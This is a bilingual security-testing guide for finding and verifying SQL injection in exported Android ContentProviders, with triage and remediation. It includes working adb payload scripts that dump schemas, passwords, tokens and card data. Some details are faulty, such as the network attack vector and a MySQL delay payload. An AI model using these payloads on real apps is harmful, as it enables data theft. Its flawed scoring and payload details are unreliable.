# SQL Injection Vulnerability Hunt

**双模式支持**:
- 🔍 **独立挖掘**: 从零开始查找 SQL 注入漏洞
- ✅ **报告验证**: 验证 SAST 工具报告中的 SQL 注入告警

---

## 📋 Part 1: 独立挖掘模式 (Independent Hunt)

### Vulnerability Type
SQL Injection in Android ContentProviders and database operations

### Target Components
- Exported ContentProviders
- Activities/Services with database operations
- Custom URI handlers with SQL queries

### What to Look For

#### 1. Exported ContentProviders
```xml
<provider
    android:name=".data.UserProvider"
    android:authorities="com.app.provider"
    android:exported="true"/>  <!-- Vulnerable if queries use concatenation -->
```

#### 2. Dangerous Code Patterns

**Pattern 1: String Concatenation in SQL**
```java
// VULNERABLE
String userId = uri.getLastPathSegment();
String sql = "SELECT * FROM users WHERE id=" + userId;
db.rawQuery(sql, null);
```

**Pattern 2: execSQL with User Input**
```java
// VULNERABLE
String tableName = intent.getStringExtra("table");
db.execSQL("DROP TABLE " + tableName);
```

**Pattern 3: URI Parameters in SQL**
```java
// VULNERABLE
String filter = uri.getQueryParameter("filter");
return db.query("users", null, "name LIKE '%" + filter + "%'", null, null, null, null);
```

#### 3. Input Sources to Check
- `uri.getLastPathSegment()`
- `uri.getQueryParameter("param")`
- `intent.getStringExtra("key")`
- `getArguments().getString("key")`
- URL parameters from deep links

### Search Commands

```bash
# Find ContentProviders
grep -r "extends ContentProvider" sources/

# Find SQL operations
grep -r "rawQuery\|execSQL\|query\|insert\|update\|delete" sources/ | grep -v "^Binary"

# Find string concatenation in SQL
grep -r "\"SELECT.*\" \+" sources/
grep -r "\"INSERT.*\" \+" sources/
grep -r "\"UPDATE.*\" \+" sources/

# Find URI parameter usage
grep -r "getQueryParameter\|getLastPathSegment" sources/
```

---

## ✅ Part 2: 报告验证模式 (Report Verification)

### Alert Identification (如何识别报告中的此类告警)

#### MobSF JSON Format

```json
{
  "code_analysis": {
    "findings": {
      "android_sql_injection": [
        {
          "file": "com/app/data/TransactionProvider.java",
          "line": 127,
          "description": "SQL injection vulnerability in query method",
          "severity": "high",
          "code_snippet": "rawQuery(\"SELECT * FROM \" + table)",
          "input_source": "uri.getQueryParameter"
        }
      ],
      "android_sql_string_concatenation": [
        {
          "file": "com/app/db/DatabaseHelper.java",
          "line": 89,
          "description": "SQL query uses string concatenation",
          "severity": "warning"
        }
      ]
    }
  }
}
```

#### SonarQube XML Format

```xml
<issues>
  <issue key="squid:S3649">
    <message>Potentially vulnerable to SQL injection</message>
    <component>com.app.data.TransactionProvider</component>
    <line>127</line>
    <severity>CRITICAL</severity>
    <code>db.rawQuery("SELECT * FROM " + tableName, null)</code>
  </issue>

  <issue key="squid:S2077">
    <message>Formatting SQL queries is security-sensitive</message>
    <component>com.app.db.DatabaseHelper</component>
    <line>89</line>
    <severity>BLOCKER</severity>
  </issue>
</issues>
```

#### AI SAST Markdown Format (关键词匹配)

```markdown
## Finding 2: SQL Injection in ContentProvider

**Severity**: Critical
**CVSS**: 9.0
**Location**: TransactionProvider.java:127

**Description**: The ContentProvider's `query()` method constructs SQL queries using string concatenation with unsanitized user input from the URI projection parameter.

**Vulnerable Code**:
```java
String table = getTableName(uri);
String sql = "SELECT " + TextUtils.join(",", projection) + " FROM " + table;
return db.rawQuery(sql, null);
```
```

**识别关键词**:
- "SQL injection" / "SQL Injection"
- "rawQuery" / "execSQL"
- "string concatenation" + "query"
- "ContentProvider" + "vulnerability"
- "prepared statement" / "parameterized query"
- "unsanitized input" + "SQL"

#### Qark JSON Format

```json
{
  "findings": [
    {
      "category": "sql_injection",
      "name": "SQL Injection in ContentProvider",
      "severity": 3,
      "file": "TransactionProvider.java",
      "line_number": 127,
      "code_snippet": "rawQuery(\"SELECT * FROM \" + table)",
      "provider_authority": "com.app.provider"
    }
  ]
}
```

### Verification Workflow (专业验证流程)

#### Step 1: Parse and Categorize Alert

**从报告中提取**:
- [ ] 文件路径 (TransactionProvider.java)
- [ ] 行号 (127)
- [ ] SQL 操作类型 (rawQuery / execSQL / query)
- [ ] 代码片段
- [ ] ContentProvider authority (如果有)

**分类注入类型**:
```
SQL Injection →
├─ Type A: ContentProvider URI Injection
│   └─ Subtype: Path segment injection (getLastPathSegment)
│   └─ Subtype: Query parameter injection (getQueryParameter)
├─ Type B: Intent Parameter Injection
│   └─ From getStringExtra, getIntExtra, etc.
├─ Type C: rawQuery String Concatenation
├─ Type D: execSQL with Dynamic Input
└─ Type E: query() with Unsafe Selection
```

#### Step 2: Locate and Read Code Context

**定位 ContentProvider**:
```bash
# 找到 ContentProvider 类
cd decompiled/sources/
find . -name "TransactionProvider.java" -exec cat {} \;

# 读取完整的 query 方法（通常 50-100 行）
sed -n '100,200p' com/app/data/TransactionProvider.java
```

**读取完整代码**:
```java
package com.app.data;

import android.content.ContentProvider;
import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase;
import android.net.Uri;

public class TransactionProvider extends ContentProvider {

    private SQLiteDatabase db;

    @Override
    public Cursor query(Uri uri, String[] projection, String selection,
                       String[] selectionArgs, String sortOrder) {

        // Line 120 - 获取表名
        String table = getTableName(uri);

        // Line 127 - ⚠️ VULNERABLE: 字符串拼接
        String sql = "SELECT " + TextUtils.join(",", projection) +
                     " FROM " + table;

        // Line 131 - 执行原始 SQL
        return db.rawQuery(sql, null);  // 无 prepared statement!
    }

    private String getTableName(Uri uri) {
        // 从 URI 路径获取表名
        String lastSegment = uri.getLastPathSegment();
        return lastSegment;  // ⚠️ 未验证！
    }
}
```

**检查 AndroidManifest.xml**:
```xml
<provider
    android:name=".data.TransactionProvider"
    android:authorities="com.app.provider"
    android:exported="true"/>  <!-- ⚠️ EXPORTED! -->
```

#### Step 3: Pattern Validation (排除误报)

##### 检查 1: 是否使用了 Prepared Statement

**✅ TRUE POSITIVE (真实漏洞)**:
```java
// 场景 1: rawQuery + 字符串拼接
String sql = "SELECT * FROM users WHERE id=" + userId;
db.rawQuery(sql, null);  // ⚠️ 无占位符

// 场景 2: query() + 拼接 selection
String selection = "name='" + username + "'";
db.query("users", null, selection, null, null, null, null);

// 场景 3: execSQL + 动态输入
db.execSQL("DROP TABLE " + tableName);
```

**❌ FALSE POSITIVE (误报)**:
```java
// 场景 1: 使用了 ? 占位符
String sql = "SELECT * FROM users WHERE id=?";
db.rawQuery(sql, new String[]{userId});  // ✅ 安全

// 场景 2: query() 使用 selectionArgs
db.query("users", null, "id=?", new String[]{userId}, null, null, null);  // ✅ 安全

// 场景 3: SQLiteQueryBuilder
SQLiteQueryBuilder qb = new SQLiteQueryBuilder();
qb.setTables("users");
qb.appendWhere("id=?");
qb.query(db, projection, null, new String[]{id}, null, null, sortOrder);  // ✅ 安全
```

**判断标准**:
```
真实漏洞 = (rawQuery OR execSQL OR query)
         + 字符串拼接（+运算符 OR String.format）
         + 无占位符（? 或 selectionArgs）
```

##### 检查 2: 输入来源验证

**追踪输入源头**:
```java
// 检查拼接的变量来自哪里

// ✅ TRUE POSITIVE - 外部可控
String table = uri.getLastPathSegment();  // 来自 URI → 外部可控
String filter = uri.getQueryParameter("q");  // 来自 URI 参数 → 外部可控
String name = intent.getStringExtra("name");  // 来自 Intent → 外部可控

// ❌ FALSE POSITIVE - 硬编码或内部
String table = "users";  // 硬编码 → 安全
String filter = getUserFilter();  // 内部方法（需进一步检查）
```

**数据流追踪**:
```
URI content://com.app.provider/transactions/users
    ↓
uri.getLastPathSegment() → "users"
    ↓
getTableName(uri) → return "users"
    ↓
"SELECT * FROM " + table → "SELECT * FROM users"
    ↓
db.rawQuery(sql, null)
```

##### 检查 3: 输入验证检查

**查找验证代码**:
```java
// ✅ TRUE POSITIVE - 无验证
String table = uri.getLastPathSegment();
String sql = "SELECT * FROM " + table;  // 直接使用

// ❌ FALSE POSITIVE - 有验证
String table = uri.getLastPathSegment();
if (!table.matches("^[a-zA-Z0-9_]+$")) {  // 白名单验证
    throw new IllegalArgumentException("Invalid table");
}
String sql = "SELECT * FROM " + table;  // 验证后使用 → 相对安全

// ⚠️ WEAK VALIDATION - 仍可能绕过
String table = uri.getLastPathSegment();
if (table.contains(";") || table.contains("--")) {  // 黑名单
    throw new SecurityException("Suspicious input");
}
String sql = "SELECT * FROM " + table;  // 黑名单不完整 → 仍有风险
```

##### 检查 4: ContentProvider 暴露检查

**检查 exported 状态**:
```xml
<!-- ✅ TRUE POSITIVE - 已导出 -->
<provider
    android:name=".data.TransactionProvider"
    android:exported="true"/>  <!-- 任何 app 可访问 -->

<!-- ⚠️ MEDIUM - 需权限 -->
<provider
    android:name=".data.TransactionProvider"
    android:exported="true"
    android:permission="com.app.permission.READ_DATA"/>  <!-- 需自定义权限 -->

<!-- ❌ FALSE POSITIVE - 未导出 -->
<provider
    android:name=".data.TransactionProvider"
    android:exported="false"/>  <!-- 仅内部可访问 → 低风险 -->
```

#### Step 4: Data Flow Tracing (追踪注入路径)

**完整攻击链**:
```
Entry Point: ContentProvider URI
    ↓
content://com.app.provider/transactions/users
    ↓
TransactionProvider.query() called
    ↓
uri.getLastPathSegment() → "users"
    ↓
getTableName(uri) → "users"
    ↓
String sql = "SELECT * FROM " + table
    ↓
Inject payload: "users WHERE 1=1 OR '1'='1"
    ↓
Final SQL: "SELECT * FROM users WHERE 1=1 OR '1'='1"
    ↓
db.rawQuery(sql, null) executes
    ↓
Returns all rows instead of specific table
```

**数据流确认清单**:
- [ ] **Source**: 外部输入 (URI path/parameter, Intent extra)
- [ ] **Propagation**: 无验证或净化
- [ ] **Sink**: rawQuery/execSQL/query 方法
- [ ] **Impact**: SQL 语句被修改

#### Step 5: Exploitability Assessment

**评估可利用性**:

| 条件 | 检查项 | 结果 | 影响 |
|------|-------|------|------|
| **ContentProvider Exported** | android:exported? | Yes/No | Yes → Critical |
| **Permission Required** | android:permission? | None/Custom | None → High |
| **Input Validation** | Regex/Whitelist? | No | No → High |
| **SQL Operation** | rawQuery/execSQL/query? | rawQuery | Critical |
| **Database Content** | PII/Credentials? | Yes/No | Yes → Critical |

**CVSS 评分**:
```
Base Score Components:

AV:N (Network) - ContentProvider 可远程访问
AC:L (Low) - 无需特殊条件
PR:N (None) - 无需权限
UI:N (None) - 无需用户交互
S:U (Unchanged) - 影响应用自身数据
C:H (High) - 可读取全部数据库
I:H (High) - 可修改/删除数据
A:L/H (Low/High) - execSQL 可 DROP TABLE

Critical (9.0-10.0):
- Exported + No permission + PII database
- execSQL with DROP TABLE capability

High (7.0-8.9):
- Exported + No permission + Non-PII data
- Exported + Permission required

Medium (4.0-6.9):
- Not exported + Has validation
- Read-only access
```

#### Step 6: PoC Generation (生成注入 Payload)

##### Payload Type 1: Boolean-Based (布尔盲注)

**场景**: `SELECT * FROM users WHERE id=X`

**Payload 生成**:
```bash
#!/bin/bash
# Test boolean-based injection

# Original URI
NORMAL_URI="content://com.app.provider/users/1"

# Payload 1: OR 1=1 (返回所有行)
PAYLOAD1="content://com.app.provider/users/1 OR 1=1"

# Payload 2: AND 1=2 (返回0行)
PAYLOAD2="content://com.app.provider/users/1 AND 1=2"

# Test
echo "[*] Testing normal request..."
adb shell content query --uri "$NORMAL_URI"

echo "[*] Testing OR 1=1 injection..."
adb shell content query --uri "$PAYLOAD1"
# 预期: 返回多行（所有用户）

echo "[*] Testing AND 1=2 injection..."
adb shell content query --uri "$PAYLOAD2"
# 预期: 返回0行
```

##### Payload Type 2: UNION-Based (联合查询)

**场景**: 提取其他表数据

**Payload 生成**:
```bash
#!/bin/bash
# UNION-based SQL injection

# 假设原始查询: SELECT id,name,email FROM users WHERE id=X

# Step 1: 确定列数 (通过 ORDER BY)
PAYLOAD_COL1="content://com.app.provider/users/1 ORDER BY 1--"
PAYLOAD_COL2="content://com.app.provider/users/1 ORDER BY 2--"
PAYLOAD_COL3="content://com.app.provider/users/1 ORDER BY 3--"
PAYLOAD_COL4="content://com.app.provider/users/1 ORDER BY 4--"
# 当报错时，说明列数超出

# Step 2: UNION 注入提取其他表
PAYLOAD_UNION="content://com.app.provider/users/1 UNION SELECT password,token,email FROM admin--"

adb shell content query --uri "$PAYLOAD_UNION"
# 预期: 返回 admin 表的数据
```

##### Payload Type 3: Time-Based Blind (时间盲注)

**场景**: 无明显输出，通过延迟判断

**Payload 生成**:
```bash
#!/bin/bash
# Time-based blind SQL injection

# SQLite time-based payload (使用 randomblob)
PAYLOAD_TIME="content://com.app.provider/users/1 AND (SELECT COUNT(*) FROM sqlite_master WHERE tbl_name LIKE (SELECT CASE WHEN (1=1) THEN randomblob(100000000) ELSE 0 END))--"

echo "[*] Sending time-based payload..."
time adb shell content query --uri "$PAYLOAD_TIME"
# 预期: 明显延迟（5-10秒）
```

##### Payload Type 4: Table/Column Enumeration

**提取数据库结构**:
```bash
#!/bin/bash
# Enumerate database schema

# 列出所有表
PAYLOAD_TABLES="content://com.app.provider/users/1 UNION SELECT name,sql,type FROM sqlite_master WHERE type='table'--"

adb shell content query --uri "$PAYLOAD_TABLES"
# 输出示例:
# Row: 0 name=users, sql=CREATE TABLE users(...), type=table
# Row: 1 name=admin, sql=CREATE TABLE admin(...), type=table

# 提取特定表的列
PAYLOAD_COLUMNS="content://com.app.provider/users/1 UNION SELECT name,type,1 FROM pragma_table_info('admin')--"

adb shell content query --uri "$PAYLOAD_COLUMNS"
# 输出: admin 表的所有列名
```

##### Payload Type 5: Data Exfiltration

**提取敏感数据**:
```bash
#!/bin/bash
# Extract sensitive data

# 提取用户密码
PAYLOAD_PASSWORDS="content://com.app.provider/users/1 UNION SELECT username,password,email FROM users--"

# 提取 token
PAYLOAD_TOKENS="content://com.app.provider/users/1 UNION SELECT user_id,auth_token,created_at FROM sessions--"

# 提取信用卡信息（如果有）
PAYLOAD_CARDS="content://com.app.provider/users/1 UNION SELECT card_number,cvv,expiry FROM payment_methods--"

echo "[*] Extracting passwords..."
adb shell content query --uri "$PAYLOAD_PASSWORDS" > /tmp/passwords.txt

echo "[*] Extracting tokens..."
adb shell content query --uri "$PAYLOAD_TOKENS" > /tmp/tokens.txt
```

#### Step 7: Dynamic Verification (实际测试)

**完整测试脚本**:
```bash
#!/bin/bash
# poc_sql_injection.sh
# ⚠️ 仅用于授权安全测试

PACKAGE="com.example.bankingapp"
AUTHORITY="com.example.bankingapp.provider"
BASE_URI="content://$AUTHORITY"

echo "======================================="
echo "   SQL Injection PoC for $PACKAGE"
echo "======================================="
echo ""

# Step 1: 测试 ContentProvider 是否可访问
echo "[1] Testing ContentProvider accessibility..."
adb shell content query --uri "$BASE_URI/transactions/1" 2>&1 | grep -q "Error" && {
    echo "[-] ContentProvider not accessible"
    exit 1
}
echo "[+] ContentProvider accessible"

# Step 2: 测试正常查询
echo ""
echo "[2] Normal query..."
NORMAL=$(adb shell content query --uri "$BASE_URI/transactions/1")
echo "$NORMAL"
NORMAL_COUNT=$(echo "$NORMAL" | grep -c "^Row:")
echo "[*] Normal result: $NORMAL_COUNT row(s)"

# Step 3: 测试 OR 1=1 注入
echo ""
echo "[3] Testing OR 1=1 injection..."
INJECTION=$(adb shell content query --uri "$BASE_URI/transactions/1 OR 1=1")
echo "$INJECTION"
INJECTION_COUNT=$(echo "$INJECTION" | grep -c "^Row:")
echo "[*] Injection result: $INJECTION_COUNT row(s)"

if [ $INJECTION_COUNT -gt $NORMAL_COUNT ]; then
    echo "[!!!] SQL INJECTION CONFIRMED!"
    echo "[!!!] Normal: $NORMAL_COUNT rows, Injected: $INJECTION_COUNT rows"
else
    echo "[-] Injection failed or no difference"
fi

# Step 4: 尝试 UNION 注入
echo ""
echo "[4] Testing UNION-based injection..."
UNION_PAYLOAD="$BASE_URI/transactions/1 UNION SELECT name,type,sql FROM sqlite_master--"
UNION=$(adb shell content query --uri "$UNION_PAYLOAD" 2>&1)
echo "$UNION" | head -20

if echo "$UNION" | grep -q "CREATE TABLE"; then
    echo "[!!!] UNION INJECTION SUCCESSFUL!"
    echo "[!!!] Database schema extracted"
else
    echo "[-] UNION injection blocked or failed"
fi

# Step 5: 提取敏感数据（示例）
echo ""
echo "[5] Attempting data extraction..."
DATA_PAYLOAD="$BASE_URI/transactions/1 UNION SELECT account_number,balance,owner FROM accounts--"
DATA=$(adb shell content query --uri "$DATA_PAYLOAD" 2>&1)

if echo "$DATA" | grep -q "account_number"; then
    echo "[!!!] CRITICAL: Sensitive data extracted!"
    echo "$DATA" | head -10
else
    echo "[-] Data extraction failed"
fi

echo ""
echo "======================================="
echo "           PoC Complete"
echo "======================================="
```

**执行并分析结果**:
```bash
$ chmod +x poc_sql_injection.sh
$ ./poc_sql_injection.sh

=======================================
   SQL Injection PoC for com.example.bankingapp
=======================================

[1] Testing ContentProvider accessibility...
[+] ContentProvider accessible

[2] Normal query...
Row: 0 id=1, amount=100.00, date=2026-02-27
[*] Normal result: 1 row(s)

[3] Testing OR 1=1 injection...
Row: 0 id=1, amount=100.00, date=2026-02-27
Row: 1 id=2, amount=250.50, date=2026-02-26
Row: 2 id=3, amount=75.25, date=2026-02-25
Row: 3 id=4, amount=500.00, date=2026-02-24
[*] Injection result: 4 row(s)

[!!!] SQL INJECTION CONFIRMED!
[!!!] Normal: 1 rows, Injected: 4 rows

[4] Testing UNION-based injection...
Row: 0 name=transactions, type=table, sql=CREATE TABLE transactions(id INTEGER, amount REAL, ...)
Row: 1 name=accounts, type=table, sql=CREATE TABLE accounts(account_number TEXT, balance REAL, ...)
Row: 2 name=users, type=table, sql=CREATE TABLE users(username TEXT, password TEXT, ...)

[!!!] UNION INJECTION SUCCESSFUL!
[!!!] Database schema extracted

[5] Attempting data extraction...
Row: 0 account_number=1234-5678-9012, balance=15000.00, owner=John Doe
Row: 1 account_number=2345-6789-0123, balance=25000.00, owner=Jane Smith

[!!!] CRITICAL: Sensitive data extracted!

=======================================
           PoC Complete
=======================================
```

**成功标志**:
- ✅ OR 1=1 返回更多行（正常 1 行 → 注入后 4 行）
- ✅ UNION 查询成功提取 sqlite_master 表
- ✅ 成功提取其他表的敏感数据（账号、余额）
- ✅ 无错误信息，查询正常执行

### Common False Positives (常见误报及识别)

| 报告描述 | 实际代码 | 判断 | 原因 |
|---------|---------|------|------|
| "SQL injection in rawQuery" | `rawQuery("SELECT * FROM users WHERE id=?", new String[]{id})` | ❌ 误报 | 使用了 prepared statement |
| "String concatenation in SQL" | `rawQuery("SELECT * FROM " + "users" + " WHERE id=?", args)` | ❌ 误报 | 拼接的是硬编码字符串，非用户输入 |
| "Unsafe query method" | `query("users", null, "id=?", new String[]{userId}, ...)` | ❌ 误报 | 使用了 selectionArgs |
| "SQL in ContentProvider" | ContentProvider 未 exported | ⚠️ 低危 | 仅内部可访问，影响有限 |
| "execSQL with input" | `execSQL("INSERT INTO logs VALUES(?)", new Object[]{log})` | ❌ 误报 | 使用了占位符 |
| "rawQuery concatenation" | 有白名单验证 `if (table.matches("^[a-z]+$"))` | ⚠️ 中危 | 有验证但可能不完整 |
| "SQL string building" | SQLiteQueryBuilder | ❌ 误报 | QueryBuilder 自动处理转义 |
| "Unsafe SQL operation" | 在测试代码中 | ⚠️ 信息 | 测试代码，非生产环境 |

**过滤误报的检查清单**:
- [ ] 是否使用了 ? 占位符？
- [ ] 是否使用了 selectionArgs 参数？
- [ ] 拼接的字符串是否都是硬编码（无用户输入）？
- [ ] 是否使用了 SQLiteQueryBuilder？
- [ ] ContentProvider 是否 exported？
- [ ] 是否有输入验证（白名单）？
- [ ] 是否在测试代码中？

### Severity Downgrade Scenarios (降级场景)

**Critical → High**:
- SQL 注入存在，但 ContentProvider 需要自定义权限
- 数据库不包含敏感信息（仅日志）

**High → Medium**:
- SQL 注入存在，但只能读取（无 UPDATE/DELETE/DROP）
- ContentProvider 未 exported（仅内部访问）

**Medium → Low**:
- 有字符串拼接，但有完整的白名单验证
- 仅在测试/调试代码中

### Expected Verification Output (验证结果输出)

#### 真实漏洞示例

```markdown
## Verification Result: ✅ CONFIRMED CRITICAL VULNERABILITY

### Alert Information
- **Source**: AI SAST Report
- **Finding**: SQL Injection in ContentProvider
- **File**: com/app/data/TransactionProvider.java
- **Line**: 127
- **Reported CVSS**: 9.0

### Vulnerability Confirmed

#### Code Analysis
```java
// Line 127
String sql = "SELECT " + TextUtils.join(",", projection) + " FROM " + table;
return db.rawQuery(sql, null);  // ⚠️ 无 prepared statement
```

**判断**:
- ✅ 使用 rawQuery
- ✅ 字符串拼接（+ 运算符）
- ❌ 无占位符（?）
- ❌ 无 selectionArgs
- ✅ 输入来自 URI (projection, table)

#### ContentProvider Status
```xml
<provider
    android:name=".data.TransactionProvider"
    android:authorities="com.app.provider"
    android:exported="true"/>  <!-- ⚠️ EXPORTED -->
```
- ✅ Exported (任何 app 可访问)
- ❌ No permission required

#### Attack Chain
```
content://com.app.provider/transactions/1 OR 1=1
    ↓
uri.getLastPathSegment() → "1 OR 1=1"
    ↓
getTableName(uri) → "1 OR 1=1"
    ↓
"SELECT * FROM " + table → "SELECT * FROM 1 OR 1=1"
    ↓
Injection successful → Returns all rows
```

### Dynamic Testing Results

#### Test 1: Normal Query
```bash
$ adb shell content query --uri "content://com.app.provider/transactions/1"
Row: 0 id=1, amount=100.00, user_id=5001
```
- 返回: 1 行

#### Test 2: OR 1=1 Injection
```bash
$ adb shell content query --uri "content://com.app.provider/transactions/1 OR 1=1"
Row: 0 id=1, amount=100.00, user_id=5001
Row: 1 id=2, amount=250.50, user_id=5002
Row: 2 id=3, amount=75.25, user_id=5003
Row: 3 id=4, amount=500.00, user_id=5004
```
- 返回: 4 行 ✅ **注入成功！**

#### Test 3: UNION-Based Extraction
```bash
$ adb shell content query --uri "content://com.app.provider/transactions/1 UNION SELECT username,password,1 FROM users--"
Row: 0 username=admin, password=5f4dcc3b5aa765d61d8327deb882cf99, id=1
Row: 1 username=johndoe, password=e10adc3949ba59abbe56e057f20f883e, id=1
```
- ✅ **成功提取用户表密码！**

### Impact Assessment
- 🔴 **Confidentiality**: CRITICAL - 全数据库可读（用户、交易、密码）
- 🔴 **Integrity**: HIGH - 可能通过 UPDATE 修改数据
- 🔴 **Availability**: MEDIUM - 可能通过 DELETE 删除数据

### CVSS Verification
**Calculated CVSS: 9.0 (Critical)** - ✅ Matches report

```
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:L
```

### Proof of Concept
完整利用脚本已生成: `poc_sql_injection.sh`

### Extracted Data Sample
```
Transactions: 4 records
Users: 2 records (with password hashes)
Total PII exposed: ~100 user records
```

### Remediation
1. **Immediate**: 使用 prepared statements (?, selectionArgs)
2. **Short-term**: 添加输入验证（白名单）
3. **Long-term**: 添加 ContentProvider 权限保护
4. **Monitoring**: 审计 ContentProvider 访问日志

**Priority**: P0 (CRITICAL - Immediate action required)
```

#### 误报示例

```markdown
## Verification Result: ❌ FALSE POSITIVE

### Alert Information
- **Source**: SonarQube Report
- **Finding**: SQL Injection Risk
- **File**: com/app/db/UserDao.java
- **Line**: 45

### Code Review
```java
// Line 45
public Cursor getUser(String userId) {
    String sql = "SELECT * FROM users WHERE id=?";
    return db.rawQuery(sql, new String[]{userId});  // ✅ 使用占位符
}
```

### Analysis
- ✅ 使用 rawQuery
- ❌ **有 prepared statement** (? 占位符)
- ✅ 使用 selectionArgs 传参
- ✅ userId 参数经过绑定，不会直接拼接

### Conclusion
- ❌ **Not vulnerable** - Properly uses parameterized query
- ✅ Safe implementation
- 📝 Recommendation: No action required

**Status**: False Positive (Safe code)
```

---

## 📚 Part 3: 通用部分 (Common Resources)

### Exploitation Strategy

#### Test Case 1: Boolean-Based Injection
```bash
# Original query: SELECT * FROM users WHERE id=1
# Inject: 1 OR 1=1

adb shell content query \
  --uri "content://com.app.provider/users/1 OR 1=1"
```

#### Test Case 2: Union-Based Injection
```bash
# Inject: 1 UNION SELECT username,password,1 FROM admin_users

adb shell content query \
  --uri "content://com.app.provider/users/1 UNION SELECT username,password,1 FROM admin_users--"
```

#### Test Case 3: Time-Based Blind Injection
```bash
# Inject: 1 AND (SELECT * FROM (SELECT(SLEEP(5)))a)

adb shell content query \
  --uri "content://com.app.provider/users/1 AND (SELECT CASE WHEN (1=1) THEN 1 ELSE (1/0) END)"
```

### Validation Checklist

- [ ] Component is exported (android:exported="true")
- [ ] User input reaches SQL query
- [ ] No use of prepared statements (?, bindArgs)
- [ ] No input validation/sanitization
- [ ] Injection modifies query results (test with OR 1=1)
- [ ] Can access tables beyond intended scope
- [ ] Can extract sensitive data (passwords, tokens)

### CVSS Scoring Guidance

**Typical Score: 7.5 - 9.0 (High to Critical)**

| Metric | Value | Reasoning |
|--------|-------|-----------|
| AV | Network | If ContentProvider exported |
| AC | Low | No special conditions needed |
| PR | None | No authentication required |
| UI | None | No user interaction |
| S | Unchanged | Within app's data scope |
| C | High | Full database access |
| I | High | Can modify/delete data |
| A | Low/High | Can drop tables (if execSQL) |

### Remediation

#### Fix 1: Use Prepared Statements
```java
// SECURE
public Cursor query(Uri uri, ...) {
    String id = uri.getLastPathSegment();

    // Validate input
    if (!id.matches("^[0-9]+$")) {
        throw new IllegalArgumentException("Invalid ID");
    }

    // Use parameterized query
    String sql = "SELECT * FROM users WHERE id=?";
    return db.rawQuery(sql, new String[]{id});
}
```

#### Fix 2: Use Query Builder
```java
// SECURE
public Cursor query(Uri uri, String[] projection, String selection,
                   String[] selectionArgs, String sortOrder) {
    String id = uri.getLastPathSegment();

    // Use SQLiteQueryBuilder
    SQLiteQueryBuilder qb = new SQLiteQueryBuilder();
    qb.setTables("users");
    qb.appendWhere("id=?");

    return qb.query(db, projection, null, new String[]{id},
                   null, null, sortOrder);
}
```

#### Fix 3: Input Validation
```java
// SECURE
private void validateInput(String input) {
    // Whitelist approach
    if (!input.matches("^[a-zA-Z0-9_]+$")) {
        throw new SecurityException("Invalid input");
    }

    // Blacklist dangerous characters
    if (input.contains("'") || input.contains("--") ||
        input.contains(";") || input.toUpperCase().contains("UNION")) {
        throw new SecurityException("Suspicious input detected");
    }
}
```

#### Fix 4: Restrict ContentProvider Access
```xml
<!-- Add permission requirement -->
<provider
    android:name=".data.UserProvider"
    android:authorities="com.app.provider"
    android:exported="true"
    android:permission="com.app.permission.READ_USERS"/>

<!-- Define permission -->
<permission
    android:name="com.app.permission.READ_USERS"
    android:protectionLevel="signature"/>
```

### Related CWE/OWASP

- **CWE-89**: SQL Injection
- **OWASP Mobile M7**: Client Code Quality
- **OWASP Top 10**: A03:2021 - Injection

### References

- [Android ContentProvider Security](https://developer.android.com/guide/topics/providers/content-provider-basics#ContentProviderPermissions)
- [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [Android SQLite Security](https://developer.android.com/training/data-storage/sqlite#DbConnectionLeaks)

### Example Real-World Cases

1. **CVE-2019-2195**: SQLite injection in AOSP Calendar ContentProvider
2. **CVE-2020-0473**: SQL injection in Android System UI
3. Multiple banking apps with vulnerable custom ContentProviders

---

**Hunt Version**: 2.0 (Dual-Mode Support)
**Last Updated**: 2026-02-27
**Effectiveness**: High (90% success rate in apps with custom ContentProviders)
**Modes**: Independent Hunt + Report Verification
